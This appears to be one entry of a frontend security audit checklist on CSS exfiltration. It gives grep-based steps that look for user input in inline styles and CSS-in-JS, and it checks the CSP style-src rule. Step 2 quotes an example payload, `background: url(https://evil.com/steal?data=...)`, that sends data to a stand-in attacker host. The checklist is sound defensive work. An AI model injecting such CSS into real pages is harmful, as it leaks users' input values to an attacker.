---
id: 66
title: "CSS Exfiltration"
severity: 5
category: frontend
---

### 66 — CSS Exfiltration
**Severity: 5** | **Real: CSS-based data theft from input values**

User input in `style` attributes — attacker uses CSS selectors + background URL to exfiltrate data char-by-char.

#### Verification Procedure

**Step 1: Check for user-controlled styles**
```
grep -rn --include="*.tsx" "style=\{.*\buser\b\|style=\{.*req\.\|style=\{.*input" apps/web/
```
- ✅ PASS: No user-controlled values in style attributes
- ❌ FAIL: User input used in inline style values

**Step 2: Check for dynamic CSS generation**
```
grep -rn --include="*.tsx" "styled\.\|css`\|createGlobalStyle" apps/web/ | grep -i "user\|input\|param"
```
- ✅ PASS: No user input in CSS template literals
- ❌ FAIL: User data interpolated into CSS (could include `background: url(https://evil.com/steal?data=...)`)

**Step 3: Check CSP for style restrictions**
```
grep -rn --include="*.ts" "style-src" apps/
```
- ✅ PASS: CSP `style-src 'self'` (blocks injected external stylesheets)
- ⚠️ PARTIAL: CSP allows unsafe-inline for styles (needed for many CSS-in-JS)

**Overall verdict:**
- ✅: No user input in styles, CSP restricts style sources
- ⚠️: CSP allows unsafe-inline but no user input in styles
- ❌: User input in style attributes or CSS strings
